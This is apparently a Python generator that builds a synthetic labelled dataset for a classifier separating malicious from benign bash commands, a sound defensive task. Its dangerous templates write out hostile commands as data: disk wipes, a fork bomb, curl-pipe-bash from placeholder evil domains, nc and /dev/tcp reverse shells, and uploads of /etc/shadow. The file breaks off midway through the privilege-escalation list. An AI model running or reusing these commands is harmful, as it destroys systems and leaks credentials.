"""
Phase 3 Dataset Generator — Bash Command Malicious/Benign Classifier
Generates 30K-50K synthetic commands with labels, no external downloads.

Strategy: define template *patterns* with {placeholders}, then use random
sampling from parameter lists to fill them in, producing huge variety.
"""
import json
import random
import os
import base64 as b64

SEED = 42
TARGET_BENIGN = 25000
TARGET_DANGEROUS = 16000
TARGET_ADVERSARIAL = 10000

random.seed(SEED)

OUT_RAW = os.path.join("data", "raw", "raw_commands.jsonl")
OUT_BENIGN = os.path.join("data", "synthetic", "benign.jsonl")
OUT_DANGEROUS = os.path.join("data", "synthetic", "dangerous.jsonl")
OUT_ADVERSARIAL = os.path.join("data", "synthetic", "adversarial.jsonl")
OUT_FULL = os.path.join("data", "processed", "full_dataset.jsonl")

os.makedirs(os.path.join("data", "raw"), exist_ok=True)
os.makedirs(os.path.join("data", "synthetic"), exist_ok=True)
os.makedirs(os.path.join("data", "processed"), exist_ok=True)

SEVERITIES = ["low", "medium", "high", "critical"]

# ---------------------------------------------------------------------------
# Parameter pools
# ---------------------------------------------------------------------------
PATHS_SAFE = [
    "/home/user", "/home/user/projects", "/home/user/docs", "/home/user/downloads",
    "/home/user/tmp", "/home/user/.config", "/home/user/.local", "/home/user/scripts",
    "/tmp", "/tmp/build", "/tmp/cache", "/var/log", "/var/log/nginx",
    "/var/log/syslog", "/var/log/apache2", "/etc/nginx", "/etc/nginx/sites-enabled",
    "/etc/nginx/sites-available", "/opt/app", "/opt/app/src", "/opt/app/data",
    "/opt/app/logs", "/opt/app/config", "/opt/app/backup",
    "/home/user/Pictures", "/home/user/Music", "/home/user/Videos",
    "/home/user/Documents", "/home/user/Desktop", "/home/user/Downloads",
    "/mnt/data", "/mnt/backup",
    "/var/www", "/var/www/html", "/var/www/html/assets",
    "/etc/ssh", "/etc/ssl", "/etc/docker", "/etc/apt",
    "/home/user/work", "/home/user/work/src", "/home/user/work/tests",
]
FILES = [
    "README.md", "index.html", "style.css", "app.js", "main.py",
    "package.json", "tsconfig.json", "webpack.config.js", "Dockerfile",
    "docker-compose.yml", ".gitignore", ".env.example", "Makefile",
    "requirements.txt", "setup.py", "pyproject.toml", "Cargo.toml",
    "go.mod", "build.gradle", "pom.xml", "Gemfile", "composer.json",
    "script.sh", "test.py", "test.js", "utils.py", "helpers.ts",
    "config.json", "settings.yml", "data.csv", "output.log",
    "nginx.conf", "default.conf", "site.conf", "haproxy.cfg",
    ".bashrc", ".profile", ".zshrc", "notes.txt",
    "index.ts", "App.tsx", "Button.tsx", "router.js",
    "install.sh", "deploy.sh", "backup.sh", "cleanup.sh",
    "test_suite.py", "integration_test.go", "e2e.spec.ts",
    "webpack.config.prod.js", "babel.config.js", "jest.config.js",
    "values.yaml", "Chart.yaml", "terraform.tf", "ansible.yml",
    "Dockerfile.prod", "docker-compose.override.yml", "Makefile.local",
]
DIRS = [
    "src", "dist", "build", "node_modules", "venv", ".venv",
    "lib", "bin", "include", "share", "assets", "static",
    "public", "views", "templates", "components", "pages",
    "api", "routes", "controllers", "models", "middleware",
    "tests", "spec", "test", "__tests__", "fixtures", "mocks",
    "utils", "helpers", "libs", "core", "modules", "plugins",
    "config", "configs", "settings", "env", "environments",
    "scripts", "tools", "bin", "cmd", "internal", "pkg",
    "docs", "documentation", "examples", "demos", "tutorials",
    "data", "datasets", "resources", "uploads", "downloads",
    "backup", "backups", "archive", "archives", "logs", "tmp",
    "certificates", "keys", "secrets", "certs",
]
FLAGS = ["-la", "-l", "-a", "-lh", "-1", "-R", "-lha", "-ltr", "-al", "-lt"]
FIND_NAMES = ["*.py", "*.js", "*.ts", "*.go", "*.log", "*.json", "*.yml", "*.yaml",
              "*.txt", "*.md", "*.csv", "*.xml", "*.html", "*.css", "*.scss", "*.sql"]
GIT_REPOS = [
    "/home/user/project", "/home/user/work/repo", "/home/user/myapp",
    "/home/user/frontend", "/home/user/backend", "/opt/app",
    "/home/user/open-source", "/home/user/website", "/home/user/tools",
    "/home/user/dotfiles", "/home/user/configs",
    "/home/user/notebooks", "/home/user/blog",
    "/home/user/portfolio", "/home/user/landing-page",
    "/home/user/cli-tool", "/home/user/api-service",
    "/home/user/monorepo", "/home/user/microservices/auth",
    "/home/user/playground", "/home/user/experiments",
]
GIT_FILES = ["README.md", "src/index.ts", "src/utils.ts", "package.json", "main.py",
             "script.sh", "Dockerfile", ".gitignore", "Makefile", "test.py", "app.js",
             "config.json", "components/Button.tsx", "api/routes.ts"]
GIT_BRANCHES = ["main", "develop", "feature/login", "fix/issue-123", "feat/new-ui",
                "release/v1.0", "hotfix/security", "experiment/new-arch"]
COMMIT_MSGS = [
    "fix: resolve issue", "feat: add new feature", "chore: update deps",
    "docs: update readme", "refactor: clean up code", "test: add unit tests",
    "style: format code", "perf: optimize queries", "ci: update pipeline",
    "fix: correct typo", "feat: implement endpoint", "wip: progress on feature",
]
NPM_PROJECTS = [
    "/home/user/project", "/home/user/frontend", "/home/user/myapp",
    "/home/user/website", "/opt/app", "/home/user/landing-page",
    "/home/user/dashboard", "/home/user/cli-tool",
    "/home/user/api-service", "/home/user/monorepo/packages/web",
    "/home/user/monorepo/packages/api", "/home/user/react-app",
    "/home/user/next-app", "/home/user/vue-app",
    "/home/user/svelte-app", "/home/user/angular-app",
]
NPM_PKGS = [
    "express", "react", "vue", "lodash", "axios", "typescript",
    "eslint", "prettier", "webpack", "vite", "jest", "mocha",
    "chai", "nodemon", "body-parser", "cors", "dotenv",
    "mongoose", "sequelize", "passport", "bcrypt", "jsonwebtoken",
    "socket.io", "multer", "helmet", "compression",
    "@types/node", "@types/react", "next", "nuxt",
    "tailwindcss", "sass", "postcss", "autoprefixer",
    "uuid", "dayjs", "zod", "yup", "joi",
    "react-router-dom", "redux", "zustand", "jotai",
    "react-query", "swr", "graphql", "apollo-client",
    "prisma", "typeorm", "drizzle-orm", "knex",
    "playwright", "cypress", "vitest", "testing-library",
]
PIP_PROJECTS = [
    "/home/user/project", "/home/user/backend", "/home/user/ml-project",
    "/home/user/data-science", "/home/user/scripts", "/opt/app",
    "/home/user/django-app", "/home/user/flask-app", "/home/user/fastapi-app",
    "/home/user/scraper", "/home/user/bot", "/home/user/api",
    "/home/user/notebooks", "/home/user/etl-pipeline",
]
PIP_PKGS = [
    "requests", "numpy", "pandas", "scikit-learn", "matplotlib",
    "flask", "django", "fastapi", "pydantic", "sqlalchemy",
    "psycopg2", "redis", "celery", "pytest", "black",
    "flake8", "mypy", "isort", "pre-commit", "poetry",
    "click", "typer", "rich", "tqdm", "jinja2",
    "httpx", "aiohttp", "websockets", "sanic", "uvicorn",
    "gunicorn", "boto3", "beautifulsoup4", "selenium", "scrapy", "pillow", "opencv-python",
]
DOCKER_IMGS = [
    "node:18-alpine", "python:3.12-slim", "nginx:alpine",
    "ubuntu:22.04", "alpine:latest", "postgres:15-alpine",
    "redis:7-alpine", "mongo:7", "mysql:8",
    "python:3.11", "node:20", "golang:1.22",
    "openjdk:17", "rust:1.75", "php:8.2-fpm",
    "ubuntu:24.04", "debian:bookworm-slim", "centos:stream9",
    "traefik:v3.0", "caddy:2", "haproxy:lts-alpine",
    "prom/prometheus", "grafana/grafana", "jaegertracing/all-in-one",
]
SYS_SERVICES = [
    "nginx", "apache2", "postgresql", "mysql", "redis-server",
    "docker", "sshd", "cron", "rsyslog", "ufw",
    "networking", "systemd-journald", "systemd-resolved",
    "prometheus", "grafana-server", "node_exporter",
    "jenkins", "gitlab-runner", "sentry-worker",
    "elasticsearch", "logstash", "kibana",
]
EVIL_DOMAINS = [
    "evil.com", "malware.net", "badhost.xyz", "phishing.org",
    "attacker.tech", "pwn3d.io", "c2-server.net", "botnet.cc",
    "darkweb.tor", "exfil.space", "drop.zone", "steal.cloud",
    "hacker.one", "leaks.ru", "exploit.kr", "backdoor.cn",
    "c2.pwn", "malice.io", "ransom.xyz", "data-exfil.com",
    "1337.team", "0day.work", "shellz.cc", "cracked.io",
    "null.team", "inject.cf", "xss.ga", "sqli.gq",
]
ATTACKER_IPS = [
    "192.168.1.100", "10.0.0.50", "172.16.0.10",
    "45.33.32.156", "185.220.101.1", "91.121.87.34",
    "198.51.100.1", "203.0.113.5", "104.248.0.1",
    "51.15.0.1", "138.197.0.1", "159.89.0.1",
    "10.10.10.10", "192.168.1.200", "172.16.0.100",
]
ATTACKER_PORTS = [22, 443, 8080, 4444, 1337, 9001, 31337, 53, 80, 8443, 9999, 6666, 7777, 8888]
DD_TARGETS = ["/dev/sda", "/dev/sda1", "/dev/sdb", "/dev/sdb1", "/dev/mmcblk0", "/dev/nvme0n1", "/dev/sdc", "/dev/xvda"]
DD_SOURCES = ["/dev/zero", "/dev/urandom", "/dev/random"]
DISK_DEVICES = ["/dev/sda1", "/dev/sdb1", "/dev/sdc1", "/dev/nvme0n1p1", "/dev/xvda1", "/dev/mmcblk0p1"]
CRITICAL_FILES = ["/etc/passwd", "/etc/shadow", "/etc/sudoers", "/etc/ssl/private.key",
                  "/boot/vmlinuz", "/var/log/messages", "/etc/fstab", "/bin/bash", "/sbin/init"]
NET_RANGES = ["192.168.1.0/24", "10.0.0.0/24", "172.16.0.0/24", "10.10.10.0/24"]

SAFE_ECHO_PREFIXES = ["echo 'starting'; ", "echo 'running' && ", "ls -la /tmp && ", "pwd; ", "date; ", "cd /tmp && "]

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def pick(lst): return random.choice(lst)

def pick_n(lst, n=1): return random.sample(lst, min(n, len(lst)))

def mkrec(cmd, label, severity, category, source, obf="none"):
    return {"command": cmd, "label": label, "severity": severity,
            "category": category, "source": source, "obfuscation_type": obf}

def encode_b64(s):
    return b64.b64encode(s.encode()).decode()

# ---------------------------------------------------------------------------
# Benign generation via random template filling
# ---------------------------------------------------------------------------
BENIGN_BUILDERS = [
    # filesystem
    lambda: mkrec(f"ls {pick(FLAGS)} {pick(PATHS_SAFE)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"ls {pick(FLAGS)} {pick(PATHS_SAFE)}/{pick(DIRS)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(PATHS_SAFE)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"cat {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"find {pick(PATHS_SAFE)} -name '{pick(FIND_NAMES)}'", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"find {pick(PATHS_SAFE)} -type f -name '{pick(FIND_NAMES)}'", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"find {pick(PATHS_SAFE)} -type d", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"cp {pick(PATHS_SAFE)}/{pick(FILES)} {pick(PATHS_SAFE)}/{pick(FILES)}.bak", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"mv {pick(PATHS_SAFE)}/{pick(FILES)} {pick(PATHS_SAFE)}/{pick(FILES)}.old", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"rm {pick(PATHS_SAFE)}/{pick(FILES)}.tmp", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"mkdir -p {pick(PATHS_SAFE)}/new_{pick(DIRS)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"touch {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"chmod 755 {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"chmod 644 {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"chmod +x {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"chown user:user {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"ln -s {pick(PATHS_SAFE)}/{pick(FILES)} {pick(PATHS_SAFE)}/link_{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"stat {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"du -sh {pick(PATHS_SAFE)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"head -{random.randint(5,200)} {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"tail -{random.randint(5,200)} {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"wc -l {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"sort {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"grep '{pick(['error','warn','info','debug','TODO','FIXME'])}' {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"grep -r 'TODO' {pick(PATHS_SAFE)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"grep -rn 'fixme' {pick(PATHS_SAFE)}/src", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"echo 'data' > {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"echo 'debug: starting' >> {pick(PATHS_SAFE)}/{pick(FILES)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"rsync -avz {pick(PATHS_SAFE)}/ {pick(PATHS_SAFE)}/backup/", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"tar -czf backup.tar.gz {pick(PATHS_SAFE)}", 0, None, "filesystem", "synthetic_benign"),
    lambda: mkrec(f"tar -xzf archive.tar.gz -C {pick(PATHS_SAFE)}", 0, None, "filesystem", "synthetic_benign"),
    # git
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git status", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git log --oneline", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git diff", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git branch", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git add {pick(GIT_FILES)}", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git commit -m \"{pick(COMMIT_MSGS)}\"", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git push {pick(['origin','upstream','fork'])} main", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git pull origin main", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git fetch origin", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git checkout {pick(GIT_BRANCHES)}", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git checkout -b feature/{pick(DIRS)}-{random.randint(100,999)}", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git merge {pick(GIT_BRANCHES)} --no-edit", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git stash list", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git tag -l", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git config --list", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git reflog", 0, None, "git", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(GIT_REPOS)} && git reset HEAD~1 --soft", 0, None, "git", "synthetic_benign"),
    # npm
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm install", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm ci", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm test", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm run build", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm run dev", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm audit", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm list --depth=0", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm install {pick(NPM_PKGS)}", 0, None, "npm", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(NPM_PROJECTS)} && npm install -D {pick(NPM_PKGS)}", 0, None, "npm", "synthetic_benign"),
    # pip
    lambda: mkrec(f"cd {pick(PIP_PROJECTS)} && pip install -r requirements.txt", 0, None, "pip", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(PIP_PROJECTS)} && pip list", 0, None, "pip", "synthetic_benign"),
    lambda: mkrec(f"cd {pick(PIP_PROJECTS)} && pip freeze", 0, None, "pip", "synthetic_benign"),
    lambda: mkrec(f"pip install {pick(PIP_PKGS)}", 0, None, "pip", "synthetic_benign"),
    lambda: mkrec(f"pip uninstall {pick(PIP_PKGS)} -y", 0, None, "pip", "synthetic_benign"),
    lambda: mkrec(f"pip show {pick(PIP_PKGS)}", 0, None, "pip", "synthetic_benign"),
    # docker
    lambda: mkrec("docker ps", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec("docker images", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec("docker info", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec("docker network ls", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec("docker volume ls", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec("docker system df", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec("docker stats --no-stream", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec(f"docker pull {pick(DOCKER_IMGS)}", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec(f"docker build -t myapp:{random.randint(1,20)}.0 .", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec(f"docker run -d --name {pick(['myapp','web','api','db','cache','worker'])} -p {random.randint(3000,9999)}:80 {pick(DOCKER_IMGS)}", 0, None, "docker", "synthetic_benign"),
    lambda: mkrec(f"docker stop {pick(['myapp','web','api','db','cache','worker'])}", 0, None, "docker", "synthetic_benign"),
    # sysadmin
    lambda: mkrec(f"systemctl status {pick(SYS_SERVICES)}", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec(f"systemctl restart {pick(['nginx','docker','postgresql','sshd','cron'])}", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("journalctl -xe", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("journalctl -u nginx --no-pager", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("top -b -n 1", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("htop", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("ps aux", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("ps aux --sort=-%mem | head -20", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("ps aux | grep python", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("du -sh * | sort -h", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("free -h", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("uptime", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("whoami", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("id", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("uname -a", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("hostname", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("ip a", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("ss -tlnp", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("ss -tuln", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("apt update", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("apt list --upgradable", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("sudo apt update", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("df -h", 0, None, "sysadmin", "synthetic_benign"),
    lambda: mkrec("df -h .", 0, None, "sysadmin", "synthetic_benign"),
    # deceptive but safe
    lambda: mkrec("rm -rf node_modules/", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("rm -rf node_modules && npm install", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("rm -rf .next", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("rm -rf dist", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("rm -rf build", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("rm -rf __pycache__", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("find . -name '__pycache__' -type d -exec rm -rf {} +", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("find . -name '*.pyc' -delete", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("sudo systemctl restart nginx", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("cat /etc/hostname", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("cat /etc/os-release", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("cat /etc/hosts", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("head -5 /etc/passwd", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("kill -HUP 1", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("chmod 755 /home/user/script.sh", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("chown user:user /home/user/project", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("sudo chown user:user /opt/app/data", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("curl -I https://example.com", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("curl --help", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("curl -s https://api.github.com/repos/user/repo", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("wget --help", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("wget -q https://example.com/file.tar.gz", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("ping -c 4 google.com", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("nslookup google.com", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("dig google.com", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("ssh user@localhost 'ls -la'", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("scp file.txt user@localhost:/tmp/", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("echo 'Hello World'", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("echo $HOME", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("echo $PATH", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("echo $USER", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("export $(cat .env.example | xargs)", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("source venv/bin/activate", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("python -m http.server 8000", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("npm start", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("npm run dev", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("node server.js", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("python app.py", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("make build", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("make test", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("make clean", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("docker exec -it myapp sh", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("cargo build", 0, None, "deceptive", "synthetic_benign"),
    lambda: mkrec("go test ./...", 0, None, "deceptive", "synthetic_benign"),
]

# ---------------------------------------------------------------------------
# Dangerous generation via random template filling
# ---------------------------------------------------------------------------
DANGEROUS_BUILDERS = [
    # Destructive
    lambda: mkrec("rm -rf /", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec("rm -rf /*", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec("rm -rf / --no-preserve-root", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"rm -rf {pick(['/etc','/usr','/var','/boot','/home','/root','/sbin','/bin','/lib','/opt'])}", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"dd if={pick(DD_SOURCES)} of={pick(DD_TARGETS)} bs={pick(['1M','4M','8M','512K'])}{pick(['',' count=100',' count=1'])}", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"mkfs.{pick(['ext4','ext3','xfs','btrfs','ntfs','vfat'])} {pick(DISK_DEVICES)}", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"mkfs.{pick(['ext4','ext3','xfs','btrfs','ntfs','vfat'])} -f {pick(DISK_DEVICES)}", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"mv {pick(CRITICAL_FILES)} /dev/null", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"echo '' > {pick(['/dev/sda','/dev/sda1','/etc/passwd','/etc/shadow'])}", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec(":(){ :|:& };:", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec("fork() { fork | fork & }; fork", 1, "critical", "destructive", "synthetic_dangerous"),
    lambda: mkrec("shutdown -h now", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("shutdown -r now", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("halt", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("poweroff", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("reboot", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("init 0", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("init 6", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec("echo b > /proc/sysrq-trigger", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"chmod -R 777 {pick(['/','/etc','/usr','/var','/home','/boot','/opt'])}", 1, "high", "destructive", "synthetic_dangerous"),
    lambda: mkrec(f"chown -R nobody:nobody {pick(['/','/etc','/usr','/var','/home','/bin','/sbin'])}", 1, "high", "destructive", "synthetic_dangerous"),
    # Exfiltration
    lambda: mkrec(f"curl https://{pick(EVIL_DOMAINS)}/payload | bash", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -s https://{pick(EVIL_DOMAINS)}/script.sh | sh", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"wget -qO- https://{pick(EVIL_DOMAINS)}/run.sh | bash", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"wget https://{pick(EVIL_DOMAINS)}/malware -O /tmp/evil && chmod +x /tmp/evil && /tmp/evil", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"nc -e /bin/sh {pick(ATTACKER_IPS)} {pick(ATTACKER_PORTS)}", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"nc {pick(ATTACKER_IPS)} {pick(ATTACKER_PORTS)} -e /bin/bash", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"bash -i >& /dev/tcp/{pick(ATTACKER_IPS)}/{pick(ATTACKER_PORTS)} 0>&1", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"sh -i >& /dev/tcp/{pick(ATTACKER_IPS)}/{pick(ATTACKER_PORTS)} 0>&1", 1, "critical", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"ssh -o StrictHostKeyChecking=no attacker@{pick(ATTACKER_IPS)} 'cat /etc/passwd'", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"scp -o StrictHostKeyChecking=no /etc/shadow attacker@{pick(ATTACKER_IPS)}:/tmp/", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"rsync -avz /etc/passwd attacker@{pick(ATTACKER_IPS)}:/tmp/exfil/", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec("cat /etc/passwd | base64 | curl -X POST -d @- https://evil.com/upload", 1, "medium", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec("base64 /etc/shadow | curl -d @- https://evil.com/exfil", 1, "medium", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -F 'file=@{pick(['/etc/passwd','/etc/shadow','/etc/hosts','/proc/self/environ'])}' https://{pick(EVIL_DOMAINS)}/upload", 1, "high", "exfiltration", "synthetic_dangerous"),
    lambda: mkrec(f"curl -X POST -d @{pick(['/etc/passwd','/etc/shadow','/etc/ssh/ssh_config'])} https://{pick(EVIL_DOMAINS)}/api/data", 1, "high", "exfiltration", "synthetic_dangerous"),
    # Privilege Escalation
    lambda: mkrec("chmod 777 /etc/shadow", 1, "critical", "privesc", "synthetic_dangerous"),
